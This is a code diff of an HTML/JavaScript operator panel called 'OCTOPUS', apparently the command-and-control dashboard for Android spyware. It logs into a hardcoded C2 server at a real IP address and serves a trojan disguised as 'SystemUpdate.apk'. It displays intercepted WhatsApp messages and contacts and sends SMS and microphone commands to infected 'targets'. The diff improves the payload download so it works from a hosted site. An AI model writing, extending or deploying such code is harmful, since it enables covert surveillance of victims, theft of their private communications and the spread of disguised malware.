@@ -8,25 +8,19 @@
         @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&family=Syncopate:wght@700&display=swap');
         :root { --red: #ff1a1a; --bg: #000; --panel: #080808; --border: #1a1a1a; }
         body { margin: 0; background: var(--bg); color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; height: 100vh; overflow: hidden; }
-        
-        /* Login */
         #login-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
         .login-card { width: 100%; max-width: 380px; padding: 40px; background: #050505; border: 1px solid var(--border); border-radius: 40px; text-align: center; }
         input { width: 100%; background: #000; border: 1px solid #111; padding: 15px; border-radius: 15px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box; }
         .login-btn { width: 100%; padding: 15px; border-radius: 30px; border: none; background: #fff; color: #000; font-family: 'Syncopate'; font-size: 10px; cursor: pointer; }
-
-        /* Dashboard */
         nav { width: 280px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 30px 0; }
         .nav-link { padding: 18px 35px; color: #555; text-decoration: none; font-size: 12px; text-transform: uppercase; border-left: 3px solid transparent; cursor: pointer; }
         .nav-link.active { color: #fff; border-left: 3px solid var(--red); }
         main { flex: 1; padding: 40px; overflow-y: auto; background: radial-gradient(circle at top right, #1a0000, #000); }
-        
         #target-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
         .card { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 25px; padding: 25px; margin-bottom: 15px; }
-        .intel-log { background: rgba(255,255,255,0.03); border-left: 2px solid var(--red); padding: 12px; margin-bottom: 10px; font-size: 13px; border-radius: 0 10px 10px 0; }
+        .intel-log { background: rgba(255,255,255,0.03); border-left: 2px solid var(--red); padding: 12px; margin-bottom: 10px; font-size: 13px; }
         .cmd-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
         .cmd-btn { background: #111; border: 1px solid #222; color: #fff; padding: 8px; border-radius: 8px; font-size: 9px; cursor: pointer; }
-        .cmd-btn:hover { background: var(--red); }
     </style>
 </head>
 <body>
@@ -42,7 +36,7 @@
     <nav id="sidebar" style="display:none;">
         <div style="text-align: center; margin-bottom: 40px; font-family:'Syncopate'; color:var(--red); font-size: 20px;">OCTOPUS</div>
         <div class="nav-link active">Live Control</div>
-        <a href="http://51.68.234.157:20211/download/SystemUpdate.apk" class="nav-link" style="color:var(--red)">Build/Download APK</a>
+        <div class="nav-link" onclick="downloadAPK()" style="color:var(--red)">Build/Download APK</div>
     </nav>
 
     <main id="main-content" style="display:none;">
@@ -50,12 +44,13 @@
             <h1 style="font-family: 'Syncopate'; font-size: 18px;">COMMAND CENTER</h1>
             <div id="status" style="font-size: 10px; color: #444;">LINKING...</div>
         </header>
-
         <div id="target-container"></div>
     </main>
 
     <script>
         let socket;
+        const SERVER_URL = "http://51.68.234.157:20211";
+
         function login() {
             if(document.getElementById('pass').value === "octopus_xx1") {
                 document.getElementById('login-overlay').style.display = 'none';
@@ -65,11 +60,18 @@
             } else { alert("ACCESS DENIED"); }
         }
 
-        function startC2() {
-            socket = io("http://51.68.234.157:20211", {
-                query: { type: 'mastermind', key: 'octopus_xx1' }
-            });
+        // FIXED: Force download even on HTTPS Netlify
+        function downloadAPK() {
+            const link = document.createElement('a');
+            link.href = SERVER_URL + "/download/SystemUpdate.apk";
+            link.download = "SystemUpdate.apk";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
 
+        function startC2() {
+            socket = io(SERVER_URL, { query: { type: 'mastermind', key: 'octopus_xx1' } });
             socket.on('connect', () => {
                 document.getElementById('status').innerText = "CORE ONLINE";
                 document.getElementById('status').style.color = "#0f0";
@@ -77,19 +79,13 @@
 
             socket.on('update_dashboard', (res) => {
                 let grid = document.getElementById('target-container');
-                
-                // IF DATA IS WHATSAPP INTEL
                 if (res.data.type === 'wa_message' || res.data.type === 'wa_contact') {
                     const log = document.createElement('div');
                     log.className = 'intel-log';
-                    const time = new Date().toLocaleTimeString();
-                    const type = res.data.type === 'wa_contact' ? 'TARGET_ACTIVE' : 'MSG_IN';
-                    log.innerHTML = `<span style="color:var(--red)">[${time}] ${type}:</span> ${res.data.msg || res.data.name}`;
+                    log.innerHTML = `<span style="color:var(--red)">[INTEL]:</span> ${res.data.msg || res.data.name}`;
                     grid.prepend(log);
                     return;
                 }
-
-                // IF DATA IS DEVICE INFO (CARDS)
                 let card = document.getElementById(res.id);
                 if(!card) {
                     card = document.createElement('div');
@@ -98,9 +94,8 @@
                     grid.appendChild(card);
                 }
                 card.innerHTML = `
-                    <div style="font-size: 9px; color: #0f0; letter-spacing:1px;">● ONLINE | ${res.id}</div>
-                    <div style="font-size: 18px; font-weight:700; margin: 10px 0;">${res.data.model || 'Android Target'}</div>
-                    <div style="font-size: 10px; color: #555;">BATTERY: ${res.data.battery || '??'}%</div>
+                    <div style="font-size: 9px; color: #0f0;">● ONLINE | ${res.id}</div>
+                    <div style="font-size: 18px; font-weight:700; margin: 10px 0;">${res.data.model || 'Target'}</div>
                     <div class="cmd-grid">
                         <button class="cmd-btn" onclick="send('${res.id}', 'sms')">SMS</button>
                         <button class="cmd-btn" onclick="send('${res.id}', 'mic')">MIC</button>
@@ -109,10 +104,7 @@
             });
         }
 
-        function send(id, act) {
-            socket.emit('run_action', { targetId: id, action: act });
-            console.log("Command Dispatched: " + act);
-        }
+        function send(id, act) { socket.emit('run_action', { targetId: id, action: act }); }
     </script>
 </body>
 </html>
